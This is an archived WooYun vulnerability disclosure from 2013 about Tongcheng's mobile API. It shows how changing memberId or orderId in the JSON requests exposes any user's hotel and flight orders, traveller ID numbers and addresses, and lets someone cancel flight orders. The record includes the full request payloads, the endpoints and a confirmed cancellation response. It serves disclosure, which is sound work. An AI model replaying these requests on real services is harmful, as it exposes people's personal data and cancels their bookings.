{"id": 14061, "wybug_id": "wooyun-2013-017921", "wybug_title": "【同程网】任意酒店\\机票\\登机人\\常用地址信息未授权查看", "wybug_corp": "苏州同程旅游网络科技有限公司", "wybug_author": "O.o", "wybug_date": "2013-01-26 14:51", "wybug_open_date": "2013-03-12 14:51", "wybug_type": "敏感信息泄露", "wybug_level": "高", "wybug_rank_0": "16", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["敏感信息泄露", "用户敏感信息泄漏"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2013-01-26：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2013-01-27：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2013-02-06：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2013-02-16：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2013-02-26：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2013-03-12：\t细节向公众公开  简要描述： 随手丢出来看到了,另外,伪冒我刚刚399的机票付款的时候一直提示我价格更改成869,回去查查还是显示399.好内涵~ 详细说明：  酒店订单:1、任意用户订单列表http://mobileapi.17usoft.com/tcmiddleapi/hotel/orderhandler.ashx传参{\"request\":{\"body\":{\"pageSize\":\"50\",\"memberId\":\"17145645\",\"clientInfo\":{\"deviceId\":\"486874946330901\",\"versionNumber\":\"4.6.0\",\"versionType\":\"android\"},\"page\":\"1\",\"timeSpanType\":\"1\"},\"header\":{\"accountID\":\"c26b007f-c89e-431a-b8cc-493becbdd8a2\",\"deviceId\":\"486874946330901\",\"digitalSign\":\"55f1275b7020365b979a0538875a6c91\",\"refId\":\"5866720\",\"reqTime\":\"2013-01-25 22:44:52.854\",\"serviceName\":\"GetOrderList\",\"version\":\"20111128102912\"}}}通过改变用户ID变量：memberId\":\"17025644\",查询到订单编号字段：orderSerialId\":\"130125009132\",[图]获取ID下酒店订单\n\n2、任意订单详情http://mobileapi.17usoft.com/tcmiddleapi/hotel/orderhandler.ashxpost传参{\"request\":{\"body\":{\"clientInfo\":{\"deviceId\":\"486874946330901\",\"versionNumber\":\"4.6.0\",\"versionType\":\"android\"},\"orderSerialId\":\"130125005000\"},\"header\":{\"accountID\":\"c26b007f-c89e-431a-b8cc-493becbdd8a2\",\"deviceId\":\"486874946330901\",\"digitalSign\":\"5052db223223a1b9caa0cb30ead4450c\",\"refId\":\"5866720\",\"reqTime\":\"2013-01-25 22:44:54.484\",\"serviceName\":\"GetOrderDetail\",\"version\":\"20111128102912\"}}}通过更改订单号变量orderSerialId\":\"130125005000\"查询订单详情[图]获取酒店订单详情\n\n机票订单1、任意用户订单列表http://tcmobileapi.17usoft.com/MobileAPI/flight/orderhandler.ashx{\"request\":{\"body\":{\"clientInfo\":{\"deviceId\":\"486874946330901\",\"versionNumber\":\"4.6.0\",\"versionType\":\"android\"},\"memberId\":\"17145335\"},\"header\":{\"accountID\":\"c26b007f-c89e-431a-b8cc-493becbdd8a2\",\"deviceId\":\"486874946330901\",\"digitalSign\":\"40c276658239c7a6012292cdc46b79fb\",\"refId\":\"5866720\",\"reqTime\":\"2013-01-25 23:16:45.164\",\"serviceName\":\"GetFlightOrderList\",\"version\":\"20111128102912\"}}}通过更改用户ID变量\"memberId\":\"17145335\"获取到订单列表信息及用户下订单编号orderNo\":\"43828198\"[图]获取ID下机票订单号\n\n2、任意订单详情,与menberID一起查询订单http://tcmobileapi.17usoft.com/MobileAPI/flight/orderhandler.ashx{\"request\":{\"body\":{\"clientInfo\":{\"deviceId\":\"486874946330901\",\"versionNumber\":\"4.6.0\",\"versionType\":\"android\"},\"memberId\":\"17145335\",\"orderId\":\"43828198\"},\"header\":{\"accountID\":\"c26b007f-c89e-431a-b8cc-493becbdd8a2\",\"deviceId\":\"486874946330901\",\"digitalSign\":\"47d608c04c39bcf8ae098eca0c51131a\",\"refId\":\"5866720\",\"reqTime\":\"2013-01-25 23:16:36.384\",\"serviceName\":\"GetFlightOrderdetail\",\"version\":\"20111128102912\"}}} 这里的\"memberId\":\"17145622\",\"orderId\":\"43827455\"需要通过1、任意用户订单列表中获取并对应,否则显示信息为未定义.[图]获取机票订单详情1\n\n[图]获取机票订单详情2\n\n3、获取常用旅客信息（包括身份证号）http://tcmobileapi.17usoft.com/MobileAPI/general/contactHandler.ashx{\"request\":{\"body\":{\"clientInfo\":{\"deviceId\":\"486874946330901\",\"versionNumber\":\"4.6.0\",\"versionType\":\"android\"},\"memberId\":\"17145542\"},\"header\":{\"accountID\":\"c26b007f-c89e-431a-b8cc-493becbdd8a2\",\"deviceId\":\"486874946330901\",\"digitalSign\":\"1efefd983244229fa185ffd07eb03fbf\",\"refId\":\"5866720\",\"reqTime\":\"2013-01-25 23:07:01.444\",\"serviceName\":\"GetContactList\",\"version\":\"20111128102912\"}}}[图]获取登机人信息\n\n4、机票取消http://tcmobileapi.17usoft.com/MobileAPI/flight/orderhandler.ashx{\"request\":{\"body\":{\"memberId\":\"17145645\",\"memberName\":\"181ytghw888\",\"clientInfo\":{\"deviceId\":\"486874946330901\",\"versionNumber\":\"4.6.0\",\"versionType\":\"android\"},\"cancelReason\":\"4\",\"orderId\":\"43830981\"},\"header\":{\"accountID\":\"c26b007f-c89e-431a-b8cc-493becbdd8a2\",\"deviceId\":\"486874946330901\",\"digitalSign\":\"2384b1bf7507eed18f2259fe0155a6c1\",\"refId\":\"5866720\",\"reqTime\":\"2013-01-25 23:27:25.634\",\"serviceName\":\"CancelFlightOrder\",\"version\":\"20111128102912\"}}}这里的\"memberId\":\"17145622\",\"orderId\":\"43827455\"需要通过1、任意用户订单列表中获取并对应第一次取消的时候没截图.又不能去取消其他人的机票,所以补上一个信用卡禁止取消的来验证.取消成功返回{\"response\":{\"header\":{\"rspType\":\"0\",\"rspCode\":\"0000\",\"rspDesc\":\"取消订单成功\"},\"body\":\"\"}}[图]取消机票订单\n\n常用地址查询http://tcmobileapi.17usoft.com/MobileAPI/General/ReciverHandler.ashx{\"request\":{\"body\":{\"clientInfo\":{\"deviceId\":\"486874946330901\",\"versionNumber\":\"4.6.0\",\"versionType\":\"android\"},\"memberId\":\"17145645\"},\"header\":{\"accountID\":\"c26b007f-c89e-431a-b8cc-493becbdd8a2\",\"deviceId\":\"486874946330901\",\"digitalSign\":\"e4c06c6a3573a4d935ee58f9295eaa2a\",\"refId\":\"5866720\",\"reqTime\":\"2013-01-25 23:36:13.874\",\"serviceName\":\"QueryReciver\",\"version\":\"20111128102912\"}}}[图]常用地址查询\n\n   漏洞证明：     修复方案：  接口验证,另外还有酒店订单取消等其他接口不一一列举了。现在只要用户ID和订单ID符合就可以操作所有订单。   版权声明：转载请注明来源 O.o@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：19  确认时间：2013-01-27 20:00 厂商回复： 非常严重，非常感谢，我们尽快排查和修复 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2013-01-26 14:55 |    \t\tO.o \t\t\t( 普通白帽子  |\t\t\t        Rank:105 漏洞数:12        | ส็็็็็็็็็็็็็็็็็็็...)\t\t \n  -机场MM：先森您好，您的机票不存在哦~您不能换登机牌哦~-XSSER：不会吖，我明明在同程网订票的哦~-机场MM：先森，您的订单已经被取消了呢~-XSSER：我勒个去！    \n     2013-01-26 15:31 |    \t\txsser  \t\t\t( 普通白帽子  |\t\t\t        Rank:254 漏洞数:18        | 当我又回首一切,这个世界会好吗?)\t\t \n  这个报了好多次了    \n     2013-01-26 16:09 |    \t\tO.o \t\t\t( 普通白帽子  |\t\t\t        Rank:105 漏洞数:12        | ส็็็็็็็็็็็็็็็็็็็...)\t\t \n  @xsser 接口一样的话帮忙删了~谢谢~    \n     2013-01-28 09:23 |    \t\t顺子 \t\t\t( 普通白帽子  |\t\t\t        Rank:236 漏洞数:36        | 0-0努力像正常青年靠近，再也不当上错图的2...)\t\t \n  -机场MM：先森您好，您的机票不存在哦~您不能换登机牌哦~ -XSSER：不会吖，我明明在同程网订票的哦~ -机场MM：先森，您的订单已经被取消了呢~ -XSSER：我勒个去！    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 19, "Ranks": null}